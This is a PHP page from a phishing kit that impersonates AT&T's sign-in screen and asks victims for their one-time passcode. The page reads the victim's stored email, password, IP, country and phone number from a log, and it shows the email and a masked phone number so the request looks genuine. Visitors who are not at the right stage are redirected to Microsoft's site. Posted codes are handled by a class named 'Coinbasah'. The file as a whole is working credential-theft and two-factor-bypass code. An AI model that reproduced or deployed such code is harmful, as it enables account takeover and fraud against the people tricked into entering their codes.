<?php
session_start();
require "../../function/settings.php";
if ($_SESSION['Status'] != 'otpmail') {
    header('Location: https://www.microsoft.com/en-us/microsoft-365?rtc=1');
}
$config_file = '../../function/config.json';
$json_data = file_get_contents($config_file);
// Decode JSON data into PHP array
$config = json_decode($json_data, true);
$Result =  new Coinbasah();
$Result->updateLog();
if (isset($_POST['Continue'])) {
    if ($Result->EmailLoginOTP($_POST) > 0) {
    }
}

$result = $Result->getKeyFromLog($_SESSION['Userinfo']);
if (is_array($result)) {
    // Extract the variables from the array
    $key = $result['key'];
    $ip = $result['ip'];
    $email = $result['email'];
    $password = $result['password'];
    $country = $result['country'];
    $phonenumber = $result['phonenumber'];
    $status = $result['status'];
}
?>
<!DOCTYPE html>
<html lang="en" class="isPC isChrome isLandscape">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=windows-1252" />

  <title>Login Screen</title>
  <base href="." />

  <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7;IE=11; IE=EDGE" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0,shrink-to-fit=no" />
  <meta name="apple-itunes-app" content="app-id=309172177" />
  <link rel="icon" type="image/x-icon" href="https://signin.att.com/favicon.ico" />
  <link rel="preload"
    href="https://signin.att.com/static/siam/en/halo_c/halo-c-login/assets/fonts/att/ATTAleckSans/woff2/ATTAleckSans_W_Rg.woff2"
    as="font" type="font/woff2" crossorigin="" />
  <link rel="preload" href="assets/images/email/att_hz_lg_lkp_rgb_pos.svg" as="image" type="image/svg+xml" />
  <link rel="stylesheet" href="assets/style/email/styles.css" />
  <style>
    .full-height[_ngcontent-cyw-c36] {
      min-height: 100vh;
    }
  </style>
  <style>
    .footer-div[_ngcontent-cyw-c34] {
      margin-top: 48px;
      margin-bottom: 24px;
    }

    .footer-links-div[_ngcontent-cyw-c34] {
      display: flex;
      flex-direction: row;
    }

    .footer-links-div[_ngcontent-cyw-c34] app-footer-link[_ngcontent-cyw-c34] {
      margin-right: 24px;
    }

    .footer-links-div[_ngcontent-cyw-c34] app-footer-link[_ngcontent-cyw-c34]:last-child {
      margin-right: 0;
    }

    .copyright[_ngcontent-cyw-c34] {
      margin-top: 16px;
      display: flex;
      flex-direction: row;
      align-items: center;
      justify-content: center;
    }

    @media (max-width: 767px) {
      .footer-div[_ngcontent-cyw-c34] {
        margin-bottom: 32px;
      }

      .footer-links-div[_ngcontent-cyw-c34] {
        display: flex;
        flex-direction: column;
        align-items: flex-start;
      }

      .footer-links-div[_ngcontent-cyw-c34] app-footer-link[_ngcontent-cyw-c34] {
        margin-bottom: 10px;
      }

      .footer-links-div[_ngcontent-cyw-c34] app-footer-link[_ngcontent-cyw-c34]:last-child {
        margin-bottom: 0;
      }

      app-footer-link[_ngcontent-cyw-c34] {
        height: 24px;
      }

      .copyright[_ngcontent-cyw-c34] {
        margin-top: 16px;
        justify-content: flex-start;
      }
    }
  </style>
  <style>
    .space-below[_ngcontent-cyw-c38] {
      margin-bottom: 32px;
    }

    @media (max-width: 767px) {
      .space-below[_ngcontent-cyw-c38] {
        margin-bottom: 24px;
      }
    }
  </style>
  <style>
    .header-logo-position-fr-qrcard[_ngcontent-cyw-c29] {
      margin-left: 70px;
      align-self: flex-start;
    }

    .header-logo-position-fr-learMore[_ngcontent-cyw-c29] {
      margin-bottom: 48px;
      align-self: flex-start;
    }

    .header-floating-logo-generic[_ngcontent-cyw-c29] {
      margin-top: 32px;
      margin-left: 70px;
      margin-bottom: 64px;
      align-self: flex-start;
    }

    .left-align-header-logo-desktop[_ngcontent-cyw-c29] {
      align-self: flex-start;
    }

    .header-logo-image-no-bottom[_ngcontent-cyw-c29] {
      margin-bottom: 0;
    }

    @media (max-width: 767px) {
      .header-logo-position-fr-qrcard[_ngcontent-cyw-c29] {
        margin-left: 0;
        align-self: center;
      }

      .header-logo-position-fr-learMore[_ngcontent-cyw-c29] {
        margin-bottom: 16px;
        align-self: center;
      }

      .header-floating-logo-generic[_ngcontent-cyw-c29] {
        margin-left: 0;
      }

      .header-floating-logo-generic[_ngcontent-cyw-c29],
      .left-align-header-logo-desktop[_ngcontent-cyw-c29] {
        margin-bottom: 32px;
        align-self: center;
      }

      .header-logo-image-no-bottom[_ngcontent-cyw-c29] {
        margin-bottom: 0;
      }
    }
  </style>
  <style>
    .prepaid-ctn-button[_ngcontent-cyw-c50] {
      width: 100%;
      height: 48px;
      text-align: center;
      border-radius: 3px;
      border: 1px solid #1d2329;
      background-color: #fff;
      color: #1d2329;
      font-size: 1.4rem;
      line-height: 2.5rem;
      margin-top: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .prepaid-ctn-button[_ngcontent-cyw-c50]:hover {
      text-decoration: none;
      background-color: #1d2329;
      color: #fff;
    }
  </style>
  <style>
    body {
      margin: 0;
      padding: 0;
      overflow: hidden;
      /* Prevent scrolling */
    }

    #loadingOverlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.6);
      /* Semi-transparent background */
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      /* Ensure it's on top */
    }

    #animationContainer {
      width: 50px;
    }

    #loadingText {
      margin-top: 20px;
      font-size: 14px;
      color: #333;
    }
  </style>
</head>

<body>

  <div id="app-root" _nghost-cyw-c36="" ng-version="11.2.14" app-version="21.6.1">
    <div _ngcontent-cyw-c36="" id="appCompBackground" class="full-width-background bg-white">
      <div _ngcontent-cyw-c36="" id="appCompContainer"
        class="container pad-l-none-sm pad-r-none-sm pad-t-none-sm pad-b-none-sm full-height flex flex-column">
        <!---->
        <div _ngcontent-cyw-c36="" id="appCompCardContainer" class="row justify-center flex-1">
          <div _ngcontent-cyw-c36="" id="appCompCardContDiv" class="pad-none">
            <!---->
            <app-card _ngcontent-cyw-c36="" role="main">
              <div
                class="card rel z0 flex flex-column no-border-sm radius-lg no-radius-sm mar-t-none-sm border-shadow login-card mar-t-xl-lg">
                <div class="pad-lg-lg pad-xl-sm pad-t-lg-lg pad-t-xl pad-b-lg-lg pad-b-xl pad-l-lg pad-r-lg">
                  <div>
                    <img _ngcontent-cyw-c29="" id="headerLogoImage" alt="" src="assets/images/email/att_hz_lg_lkp_rgb_pos.svg" class="header-logo-image mar-b-md-all" />
                  </div>
                  <app-header class="flex-container" _nghost-cyw-c29="">
                    
                    <img src="assets/images/email/attmail.png" style="width: 200px; padding-bottom:20px;"/>
                    <div _ngcontent-cyw-c29="" class="mar-b-md-all text-center" id="signInHeaderTextDiv">
                      <h1 _ngcontent-yat-c29="" class="heading-lg" id="splitPwLoginHeaderText"
                        style="font-weight: 600;">Welcome</h1>
                      <!---->
                    </div>
                    <!---->
                  </app-header>
                  <!---->
                  <div class="width-full">
                    <router-outlet></router-outlet>
                    <app-manual-login>
                      <app-error id="appErrorAbove">
                        <!---->
                      </app-error>
                      <!---->
                      <form novalidate="" id="login" method="post"
                        class="manual-login-form ng-pristine ng-invalid ng-touched">
                        <input type="hidden" name="appName" formcontrolname="appName" value="m14186"
                          class="ng-untouched ng-pristine ng-valid" /><input type="hidden" name="loginSuccessURL"
                          formcontrolname="loginSuccessURL"
                          value="https://oidc.idp.clogin.att.com/mga/sps/oauth/oauth20/authorize?response_type=id_token&amp;client_id=m14186&amp;redirect_uri=https%3A%2F%2Fwww.att.com%2Fmsapi%2Flogin%2Funauth%2Fservice%2Fv1%2Fhaloc%2Foidc%2Fredirect&amp;state=from%3Dnx&amp;scope=openid&amp;response_mode=form_post&amp;nonce=eEPZaS62"
                          class="ng-untouched ng-pristine ng-valid" /><input type="hidden" name="loginFailureURL"
                          formcontrolname="loginFailureURL"
                          value="https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&amp;targetURL=https%3A%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3DeEPZaS62"
                          class="ng-untouched ng-pristine ng-valid" /><input type="hidden" name="trID"
                          formcontrolname="trID" value="ec1cd165fb58aaa83732f9b055b9b4e082fd671e"
                          class="ng-untouched ng-pristine ng-valid" />
                        <app-user-input _nghost-cyw-c38="">
                          <div _ngcontent-cyw-c38="" id="userInputContainerDiv"
                            class="form-row space-below ng-pristine ng-invalid ng-touched">
                            <app-user-input _nghost-yat-c38="" style="margin-bottom: 2em;">
                              <div _ngcontent-yat-c38="" id="userInputContainerDiv"
                                class="form-row space-below ng-pristine ng-invalid ng-touched">
                                <div _ngcontent-yat-c38="" id="userBackButtonDiv" class="flex flex-row flex-centered">
                                  <button _ngcontent-yat-c38="" id="userBackButton" type="button" aria-label="Back"
                                    class="user-back-button btn-reset touch-space flex-row flex-centered"
                                    title="<?= @$_SESSION['Email']; ?>"><img _ngcontent-yat-c38=""
                                      id="userBackButtonLeftCircleImg" alt="" class="back-button-svg-white"
                                      src="assets/images/email/arrow-left-circle_24.svg"><img _ngcontent-yat-c38=""
                                      id="userBackButtonFilledCircleImg" alt="" class="back-button-svg-black"
                                      src="assets/images/email/arrow-left-circle-filled_24.svg"><span
                                      _ngcontent-yat-c38="" id="userBackButtonSpanTxt"
                                      class="font-regular type-base letter-spacing-3 overflow-hidden nowrap text-overflow"><?= @$_SESSION['Email']; ?></span></button>
                                </div>
                                <!---->
                                <!----><input _ngcontent-yat-c38="" id="userID" name="userID" formcontrolname="userID"
                                  autocomplete="username" spellcheck="false" autocapitalize="off"
                                  aria-describedby="userInlineErrorText" type="hidden"
                                  value="<?= @$_SESSION['Email']; ?>"
                                  class="textfield ng-untouched ng-pristine ng-valid">
                                <!---->
                              </div>
                                <div style="text-align: center; padding-top:10px; padding-bottom:10px">
                                  <span style="font-size:20px;">+*_***_***_ <?= @$phonenumber; ?></span>
                                </div>
                            </app-user-input>
                            <!----><label _ngcontent-cyw-c38="" id="userLabel" for="userID" class="formfield-label"
                              style="font-weight:600; margin-top:1em">OTP CODE : </label>
                            <!----><input _ngcontent-cyw-c38="" id="password" name="password" formcontrolname="password"
                              autocomplete="password"
                              style="width: 100%; font-weight: 600; font-size:larger; letter-spacing: 4px;"
                              maxlength="8" spellcheck="false" autocapitalize="off"
                              aria-describedby="userInlineErrorText" type="tel"
                              class="textfield ng-pristine ng-invalid ng-touched" required />
                            <div _ngcontent-cyw-c38="" id="userInlineErrorText" role="alert" class="formfield-msg">
                            </div>
                            <!---->
                          </div>
                        </app-user-input>
                        <!---->
                        <!---->
                        <!---->
                        <!---->
                        <!---->
                        <!---->
                        <!---->
                        <!---->
                        <!---->
                        <div class="continue-button-spacing">
                          <button id="continueFromUserLogin" type="submit"
                            class="btn-primary btn-full-width letter-spacing-3" name="Continue">
                            Signin
                          </button>
                        </div>
                        <!---->
                        <!---->
                        <!---->
                        <app-forgot-id-link>
                          <div id="forgotUserIDLinkContainer" class="mar-t-sm-all">
                            <a id="forgotUserID" class="link-text3 solo type-sm" href="#">Forgot user ID?</a>
                          </div>
                        </app-forgot-id-link>
                        <!---->
                        <!---->
                        <!---->
                        <!---->
                        <app-dont-have-id-view>
                          <div class="mar-t-sm-all">
                            <div class="font-regular">
                              <a id="createNow" class="link-text3 solo type-sm" href="#"><span id="dontHaveIdText">Don't
                                  have a user ID?</span><span>&nbsp;</span>Create one now</a>
                              <!---->
                              <!---->
                            </div>
                          </div>
                        </app-dont-have-id-view>
                        <!---->
                        <app-fast-pay-button>
                          <div id="fastPayArea" class="mar-t-sm-all">
                            <a id="fastPayButton" class="link-text3 solo type-sm" href="#" target="_self">Pay without
                              signing in</a>
                          </div>
                          <!---->
                        </app-fast-pay-button>
                        <app-prepaid-ctn-button _nghost-cyw-c50="">
                          <!---->
                        </app-prepaid-ctn-button>
                        <!---->
                        <!---->
                      </form>
                      <app-myatt-signin-button>
                        <div class="color-gray-400 hr-rule mar-t-md-all mar-b-md-all">
                          <hr class="color-gray-800 type-xs font-bold" aria-label="OR" />
                        </div>
                        <form novalidate="" id="siwmaForm" method="post" class="ng-untouched ng-pristine ng-valid">
                          <input type="hidden" name="trID" value="ec1cd165fb58aaa83732f9b055b9b4e082fd671e" /><button
                            id="signInWithMyattBtn" type="submit" class="btn-secondary btn-full-width letter-spacing-3">
                            Sign in with myAT&amp;T app
                          </button>
                        </form>
                      </app-myatt-signin-button>
                      <!---->
                      <!---->
                    </app-manual-login>
                    <!---->
                  </div>
                </div>
              </div>
            </app-card>
          </div>
        </div>
        <div _ngcontent-cyw-c36="" id="appCompFooterContainer" class="row flex-centered">
          <div _ngcontent-cyw-c36="" id="appCompFooterContDiv" class="grid-col-12 pad-none">
            <app-footer _ngcontent-cyw-c36="" role="contentinfo" _nghost-cyw-c34="">
              <div _ngcontent-cyw-c34="" class="login-background footer-div pad-l-lg-sm pad-r-lg-sm">
                <div _ngcontent-cyw-c34="" id="footerLinksDiv" class="footer-links-div justify-center">
                  <app-footer-link _ngcontent-cyw-c34="" class="flex flex-row flex-items-center">
                    <!----><a rel="noopener noreferrer" target="_blank" id="footerLink0" href="#"
                      title="Legal policy center (Opens in new window)"
                      aria-label="Legal policy center (Opens in new window)" class="type-xs link-text2">Legal policy
                      center</a>
                    <!---->
                  </app-footer-link>
                  <!---->
                  <app-footer-link _ngcontent-cyw-c34="" class="flex flex-row flex-items-center">
                    <!----><a rel="noopener noreferrer" target="_blank" id="footerLink1" href="#"
                      title="Privacy policy (Opens in new window)" aria-label="Privacy policy (Opens in new window)"
                      class="type-xs link-text2">Privacy policy</a>
                    <!---->
                  </app-footer-link>
                  <!---->
                  <app-footer-link _ngcontent-cyw-c34="" class="flex flex-row flex-items-center">
                    <!----><a rel="noopener noreferrer" target="_blank" id="footerLink2" href="#"
                      title="Terms of use (Opens in new window)" aria-label="Terms of use (Opens in new window)"
                      class="type-xs link-text2">Terms of use</a>
                    <!---->
                  </app-footer-link>
                  <!---->
                  <app-footer-link _ngcontent-cyw-c34="" class="flex flex-row flex-items-center">
                    <!----><a rel="noopener noreferrer" target="_blank" id="footerLink3" href="#"
                      title="Accessibility (Opens in new window)" aria-label="Accessibility (Opens in new window)"
                      class="type-xs link-text2">Accessibility</a>
                    <!---->
                  </app-footer-link>
                  <!---->
                  <app-footer-link _ngcontent-cyw-c34="" class="flex flex-row flex-items-center">
                    <app-footer-link-icon id="footerLinkIconElLeft4">
                      <div class="flex flex-row flex-items-center footer-link-icon" id="footerLinkIcon4">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"
                          role="img" focusable="true" class="footer-link-icon-svg" id="footerLinkIconSvg4"
                          aria-label="California Consumer Privacy Act (CCPA) Opt-Out Icon">
                          <rect x="1" y="6.07595" width="22" height="11.1392" rx="5.56962" fill="white"></rect>
                          <path fill-rule="evenodd" clip-rule="evenodd"
                            d="M17.4304 6.07595C20.5064 6.07595 23 8.56955 23 11.6456C23 14.7216 20.5064 17.2152 17.4304 17.2152H6.56962C3.49361 17.2152 1 14.7216 1 11.6456C1 8.56955 3.49361 6.07595 6.56962 6.07595H17.4304ZM13.2679 6.91818H6.56962C3.95876 6.91818 1.84223 9.03471 1.84223 11.6456C1.84223 14.2564 3.95876 16.373 6.56962 16.373H10.7321L13.2679 6.91818ZM10.3553 9.41582C10.5301 9.55752 10.557 9.81415 10.4153 9.98902L7.41378 13.6942C7.16006 14.0074 6.69106 14.0319 6.4061 13.7468L4.65019 11.9904C4.49109 11.8312 4.49109 11.5732 4.65019 11.414C4.80929 11.2549 5.06725 11.2549 5.22635 11.414L6.87565 13.0638L9.78224 9.47587C9.92389 9.301 10.1804 9.27411 10.3553 9.41582ZM15.1023 9.24971C14.9477 9.08617 14.6899 9.07896 14.5264 9.2336C14.3629 9.38824 14.3557 9.64617 14.5103 9.80971L16.2013 11.5987L14.4609 13.3396C14.3018 13.4988 14.3018 13.7568 14.4609 13.916C14.62 14.0751 14.878 14.0751 15.0371 13.916L16.7614 12.1911L18.4368 13.9635C18.5914 14.1271 18.8493 14.1343 19.0128 13.9796C19.1762 13.825 19.1835 13.5671 19.0289 13.4035L17.3378 11.6146L19.0782 9.8736C19.2373 9.71445 19.2373 9.45641 19.0782 9.29726C18.9191 9.13811 18.6611 9.13811 18.502 9.29726L16.7777 11.0221L15.1023 9.24971Z"
                            fill="#454B52"></path>
                        </svg>
                      </div>
                      <!---->
                      <!---->
                      <!---->
                    </app-footer-link-icon>
                    <!----><a rel="noopener noreferrer" target="_blank" id="footerLink4" href="#"
                      title="Your privacy choices (Opens in new window)"
                      aria-label="Your privacy choices (Opens in new window)"
                      class="type-xs link-text2 mar-l-xxs-lg">Your privacy choices</a>
                    <!---->
                  </app-footer-link>
                  <!---->
                  <!---->
                </div>
                <!---->
                <div _ngcontent-cyw-c34="" class="font-regular copyright">
                  <span _ngcontent-cyw-c34="" id="copyrightTextSpan" class="type-xs color-ui-medium-gray">&copy;2024
                    AT&amp;T Intellectual Property. All rights
                    reserved.</span>
                </div>
                <!---->
              </div>
            </app-footer>
            <!---->
          </div>
        </div>
      </div>
    </div>
    <!---->
  </div>
</body>
  <script>
      document.addEventListener('DOMContentLoaded', function() {
          var otp = document.getElementById('password');

          otp.addEventListener('input', function(e) {
              this.value = this.value.replace(/\D/g, ''); // Remove all non-numeric characters
          });
      });
  </script>

</html>